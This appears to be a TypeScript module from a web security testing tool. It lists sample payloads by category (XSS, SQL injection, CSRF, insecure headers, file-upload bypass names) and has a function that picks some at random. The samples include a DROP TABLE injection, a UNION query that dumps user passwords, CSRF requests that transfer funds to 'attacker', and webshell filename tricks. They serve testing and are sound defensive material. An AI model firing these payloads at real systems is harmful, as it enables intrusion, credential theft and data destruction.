
export const PayloadExamples = {
  xss: [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(\'XSS\')">',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    'javascript:alert("XSS")',
    '<body onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<img src="javascript:alert(\'XSS\')">',
    '<div style="background-image: url(javascript:alert(\'XSS\'))">',
    '<a href="javascript:alert(\'XSS\')">Click me</a>'
  ],
  sql: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "admin' --",
    "admin' #",
    "' UNION SELECT username, password FROM users --",
    "'; DROP TABLE users; --",
    "1'; INSERT INTO log_table VALUES('Hacked', 'By SQLi') --",
    "1' AND (SELECT COUNT(*) FROM sys.tables) > 0 --"
  ],
  csrf: [
    '<form action="https://example.com/transfer" method="POST"><input type="hidden" name="to" value="attacker"><input type="hidden" name="amount" value="1000"><input type="submit" value="Click me"></form>',
    '<img src="https://example.com/transfer?to=attacker&amount=1000">',
    '<iframe src="https://example.com/transfer?to=attacker&amount=1000" style="display:none"></iframe>',
    '<script>fetch("https://example.com/transfer", {method: "POST", body: new URLSearchParams({to: "attacker", amount: "1000"}), credentials: "include"})</script>',
    '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "https://example.com/transfer"); xhr.withCredentials = true; xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); xhr.send("to=attacker&amount=1000");</script>'
  ],
  headers: [
    'X-XSS-Protection: 0',
    'Content-Security-Policy: unsafe-inline; unsafe-eval',
    'X-Frame-Options: ALLOWALL',
    'Access-Control-Allow-Origin: *',
    'Strict-Transport-Security: max-age=0'
  ],
  fileupload: [
    'malicious.php.jpg',
    'shell.php;.jpg',
    'exploit.php%00.jpg',
    'script.php::$DATA',
    'webshell.php .jpg',
    'backdoor.jpg.php',
    'exploit.svg',
    'shell.html',
    'script.js'
  ]
};

// Function to get random payloads
export function getRandomPayloads(type: keyof typeof PayloadExamples, count: number): string[] {
  const payloads = PayloadExamples[type];
  const result: string[] = [];
  
  if (count >= payloads.length) {
    return [...payloads];
  }
  
  while (result.length < count) {
    const randomIndex = Math.floor(Math.random() * payloads.length);
    const payload = payloads[randomIndex];
    if (!result.includes(payload)) {
      result.push(payload);
    }
  }
  
  return result;
}
